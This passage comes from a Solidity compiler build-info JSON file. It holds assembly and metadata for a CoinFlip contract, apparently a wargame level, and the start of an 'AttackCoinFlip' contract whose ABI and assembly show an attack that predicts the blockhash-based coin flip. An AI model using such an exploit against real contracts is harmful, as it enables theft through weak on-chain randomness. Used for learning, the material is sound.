											"source": 3
										},
										{
											"begin": 552,
											"end": 685,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "tag",
											"source": 3,
											"value": "7"
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 747,
											"end": 753,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 796,
											"end": 798,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 784,
											"end": 793,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 775,
											"end": 782,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 771,
											"end": 794,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 767,
											"end": 799,
											"name": "SLT",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "55"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "34"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "tag",
											"source": 3,
											"value": "56"
										},
										{
											"begin": 802,
											"end": 881,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 764,
											"end": 883,
											"name": "tag",
											"source": 3,
											"value": "55"
										},
										{
											"begin": 764,
											"end": 883,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 922,
											"end": 923,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 989,
											"end": 996,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 980,
											"end": 986,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 969,
											"end": 978,
											"name": "DUP6",
											"source": 3
										},
										{
											"begin": 965,
											"end": 987,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 947,
											"end": 997,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "38"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "tag",
											"source": 3,
											"value": "57"
										},
										{
											"begin": 947,
											"end": 997,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 937,
											"end": 997,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 937,
											"end": 997,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 893,
											"end": 1007,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 691,
											"end": 1014,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "tag",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 1116,
											"end": 1121,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "36"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "tag",
											"source": 3,
											"value": "59"
										},
										{
											"begin": 1101,
											"end": 1122,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1096,
											"end": 1099,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1089,
											"end": 1123,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1020,
											"end": 1129,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "tag",
											"source": 3,
											"value": "10"
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1222,
											"end": 1226,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1260,
											"end": 1262,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1249,
											"end": 1258,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1245,
											"end": 1263,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1237,
											"end": 1263,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 1335,
											"end": 1336,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1324,
											"end": 1333,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1320,
											"end": 1337,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1311,
											"end": 1317,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "39"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "tag",
											"source": 3,
											"value": "61"
										},
										{
											"begin": 1273,
											"end": 1338,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1135,
											"end": 1345,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "tag",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1388,
											"end": 1395,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1417,
											"end": 1422,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1406,
											"end": 1422,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1351,
											"end": 1428,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "tag",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1539,
											"end": 1544,
											"name": "DUP2",
											"source": 3
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "tag",
											"source": 3,
											"value": "64"
										},
										{
											"begin": 1521,
											"end": 1545,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1516,
											"end": 1519,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1509,
											"end": 1546,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1434,
											"end": 1552,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "tag",
											"source": 3,
											"value": "14"
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1651,
											"end": 1655,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1689,
											"end": 1691,
											"name": "PUSH",
											"source": 3,
											"value": "20"
										},
										{
											"begin": 1678,
											"end": 1687,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 1674,
											"end": 1692,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1666,
											"end": 1692,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1770,
											"end": 1771,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1759,
											"end": 1768,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 1755,
											"end": 1772,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 1746,
											"end": 1752,
											"name": "DUP5",
											"source": 3
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "41"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "tag",
											"source": 3,
											"value": "66"
										},
										{
											"begin": 1702,
											"end": 1773,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1558,
											"end": 1780,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "tag",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 1786,
											"end": 1966,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 1834,
											"end": 1911,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1831,
											"end": 1832,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1824,
											"end": 1912,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1931,
											"end": 1935,
											"name": "PUSH",
											"source": 3,
											"value": "11"
										},
										{
											"begin": 1928,
											"end": 1929,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 1921,
											"end": 1936,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 1955,
											"end": 1959,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 1952,
											"end": 1953,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 1945,
											"end": 1960,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "tag",
											"source": 3,
											"value": "25"
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2011,
											"end": 2014,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 2052,
											"end": 2057,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "tag",
											"source": 3,
											"value": "69"
										},
										{
											"begin": 2034,
											"end": 2058,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2025,
											"end": 2058,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2025,
											"end": 2058,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2080,
											"end": 2146,
											"name": "PUSH",
											"source": 3,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 2073,
											"end": 2078,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2070,
											"end": 2147,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "tag",
											"source": 3,
											"value": "71"
										},
										{
											"begin": 2150,
											"end": 2168,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "tag",
											"source": 3,
											"value": "70"
										},
										{
											"begin": 2067,
											"end": 2170,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2197,
											"end": 2198,
											"name": "PUSH",
											"source": 3,
											"value": "1"
										},
										{
											"begin": 2190,
											"end": 2195,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2186,
											"end": 2199,
											"name": "ADD",
											"source": 3
										},
										{
											"begin": 2179,
											"end": 2199,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2179,
											"end": 2199,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 1972,
											"end": 2205,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "tag",
											"source": 3,
											"value": "29"
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2251,
											"end": 2255,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2289,
											"end": 2290,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "tag",
											"source": 3,
											"value": "73"
										},
										{
											"begin": 2271,
											"end": 2291,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2266,
											"end": 2291,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2266,
											"end": 2291,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 2323,
											"end": 2324,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "tag",
											"source": 3,
											"value": "74"
										},
										{
											"begin": 2305,
											"end": 2325,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2300,
											"end": 2325,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2300,
											"end": 2325,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2344,
											"end": 2345,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2341,
											"end": 2342,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2338,
											"end": 2346,
											"name": "LT",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "ISZERO",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "42"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "tag",
											"source": 3,
											"value": "76"
										},
										{
											"begin": 2349,
											"end": 2367,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "tag",
											"source": 3,
											"value": "75"
										},
										{
											"begin": 2335,
											"end": 2369,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2394,
											"end": 2395,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2391,
											"end": 2392,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2387,
											"end": 2396,
											"name": "SUB",
											"source": 3
										},
										{
											"begin": 2379,
											"end": 2396,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2379,
											"end": 2396,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2211,
											"end": 2402,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										},
										{
											"begin": 2408,
											"end": 2588,
											"name": "tag",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 2408,
											"end": 2588,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2456,
											"end": 2533,
											"name": "PUSH",
											"source": 3,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 2453,
											"end": 2454,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2446,
											"end": 2534,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2553,
											"end": 2557,
											"name": "PUSH",
											"source": 3,
											"value": "12"
										},
										{
											"begin": 2550,
											"end": 2551,
											"name": "PUSH",
											"source": 3,
											"value": "4"
										},
										{
											"begin": 2543,
											"end": 2558,
											"name": "MSTORE",
											"source": 3
										},
										{
											"begin": 2577,
											"end": 2581,
											"name": "PUSH",
											"source": 3,
											"value": "24"
										},
										{
											"begin": 2574,
											"end": 2575,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2567,
											"end": 2582,
											"name": "REVERT",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "tag",
											"source": 3,
											"value": "32"
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2634,
											"end": 2635,
											"name": "PUSH",
											"source": 3,
											"value": "0"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2669,
											"end": 2670,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "tag",
											"source": 3,
											"value": "79"
										},
										{
											"begin": 2651,
											"end": 2671,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2646,
											"end": 2671,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2646,
											"end": 2671,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 2703,
											"end": 2704,
											"name": "DUP4",
											"source": 3
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "40"
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "tag",
											"source": 3,
											"value": "80"
										},
										{
											"begin": 2685,
											"end": 2705,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2680,
											"end": 2705,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2680,
											"end": 2705,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2724,
											"end": 2725,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "JUMPI",
											"source": 3
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "PUSH [tag]",
											"source": 3,
											"value": "43"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "JUMP",
											"source": 3,
											"value": "[in]"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "tag",
											"source": 3,
											"value": "82"
										},
										{
											"begin": 2729,
											"end": 2747,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "tag",
											"source": 3,
											"value": "81"
										},
										{
											"begin": 2714,
											"end": 2749,
											"name": "JUMPDEST",
											"source": 3
										},
										{
											"begin": 2771,
											"end": 2772,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2768,
											"end": 2769,
											"name": "DUP3",
											"source": 3
										},
										{
											"begin": 2764,
											"end": 2773,
											"name": "DIV",
											"source": 3
										},
										{
											"begin": 2759,
											"end": 2773,
											"name": "SWAP1",
											"source": 3
										},
										{
											"begin": 2759,
											"end": 2773,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "SWAP3",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "SWAP2",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "POP",
											"source": 3
										},
										{
											"begin": 2594,
											"end": 2779,
											"name": "JUMP",
											"source": 3,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"consecutiveWins()": "e6f334d7",
							"flip(bool)": "1d263f67"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.13+commit.abaa5c0e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"consecutiveWins\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"_guess\",\"type\":\"bool\"}],\"name\":\"flip\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"CoinFlip/CoinFlip.sol\":\"CoinFlip\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"CoinFlip/CoinFlip.sol\":{\"keccak256\":\"0xb457917871803c6d0df90c5d847bcbd6adb0a72834b471c6f68bc3ffa3517baa\",\"urls\":[\"bzz-raw://cfa3e3de574795cfd9437b67473f222319f0980f94fdde5f6abb5abf48f56474\",\"dweb:/ipfs/QmWmVGubGhWsN1wqtJq5xLdyoiMdHraaBk8yShobG9QcsX\"]},\"Fallback/SafeMath.sol\":{\"keccak256\":\"0x46eb1d4c81eed2dd868bc0a1b411e0c7a70cb9ecde086a58aee97e97134e27a4\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://87db288de7f3ebb5d38bcb26b123b7e1e14d43b5527cbad22e75337baa7b8f6f\",\"dweb:/ipfs/QmZ7ALuXLEoexu1uVqrve6kXMqkHzvL3qf7BMtdoLEA2vA\"]}},\"version\":1}",
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			},
			"CoinFlip/attackCoinFlip.sol": {
				"AttackCoinFlip": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "_contract",
									"type": "address"
								}
							],
							"name": "attack",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "guessTheCurrentBlockValue",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "guessing",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "guessingValue",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"CoinFlip/attackCoinFlip.sol\":89:704  contract AttackCoinFlip{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip/attackCoinFlip.sol\":89:704  contract AttackCoinFlip{... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x3fe6dd29\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x79e41b39\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x99b084bf\n      eq\n      tag_5\n      jumpi\n      dup1\n      0xd018db3e\n      eq\n      tag_6\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_3:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":214:533  function guessTheCurrentBlockValue() public returns(uint256){... */\n    tag_5:\n      tag_15\n      tag_16\n      jump\t// in\n    tag_15:\n      mload(0x40)\n      tag_17\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_17:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/attackCoinFlip.sol\":539:701  function attack(address _contract) public  {... */\n    tag_6:\n      tag_18\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_19\n      swap2\n      swap1\n      tag_20\n      jump\t// in\n    tag_19:\n      tag_21\n      jump\t// in\n    tag_18:\n      stop\n        /* \"CoinFlip/attackCoinFlip.sol\":152:180  uint256 public guessingValue */\n    tag_8:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"CoinFlip/attackCoinFlip.sol\":187:207  bool public guessing */\n    tag_12:\n      0x01\n      0x00\n      swap1\n      